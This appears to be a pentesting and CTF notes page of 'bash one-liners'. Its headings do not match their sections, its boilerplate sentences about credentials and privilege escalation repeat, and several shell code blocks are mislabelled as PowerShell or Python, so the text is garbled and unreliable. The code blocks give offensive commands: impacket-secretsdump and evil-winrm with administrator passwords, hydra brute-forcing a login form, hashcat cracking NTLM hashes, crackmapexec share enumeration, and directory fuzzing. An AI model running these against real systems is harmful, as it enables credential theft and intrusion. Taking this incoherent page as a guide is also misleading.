---
TitleSEO: "Bash One-Liners for Security Testing | ZureFX"
TitlePost: "Bash One-Liners for Security Testing"
Author: "ZureFX"
Description: "Personal notes on Bash One-Liners for Security Testing. Quick reference for pentesting and CTF challenges."
Keywords: "malware, oscp, windows, networking, persistence"
URL: "https://zurefx.github.io/notes/note-bash-one-liners-for-security-testing-395.html"
URL_IMAGES: ""
Date: "2024-02-21"
Tags: "Malware, OSCP, Windows, Networking, Persistence"
Section: "notes"
Lang: "en"
main_img: "note-bash-one-liners-for-security-testing-395"
Permalink: "/notes/note-bash-one-liners-for-security-testing-395.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Apache

### Node.js

Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials.

Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## atexec

### SeDebugPrivilege

```powershell
crackmapexec smb 10.128.182.203 -u administrator -p 'P@ssw0rd!' --shares
```

The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file. Lateral movement was facilitated by reusing discovered credentials across services. The application stored sensitive credentials in an unencrypted configuration file.

## rpcclient

### Unconstrained Delegation

The web application was vulnerable to Server-Side Template Injection (SSTI). Privilege escalation was possible due to misconfigured sudo permissions.

```bash
evil-winrm -i 10.54.12.152 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```bash
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.73.192.197 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.118.129.64
```

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.120.139.10
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Initial enumeration revealed several interesting open ports on the target. The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Debian

### SNMP

- `hashcat`
- `XSS`
- `IDOR`
- `CORS Misconfiguration`
- `pwncat`

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service. The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials.

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.36.251.101
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.68.178.76 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Constrained Delegation

### POP3

Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials.

Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism. The web application was vulnerable to Server-Side Template Injection (SSTI).

## LDAP

### CentOS

The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

The application stored sensitive credentials in an unencrypted configuration file. The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
nmap -sCV -p445,445,139 10.18.116.235 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.101.146.108/FUZZ
```

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.23.35.127/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.88.85.136 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.39.120.128 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.34.253.222/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.89.194.249/FUZZ
```
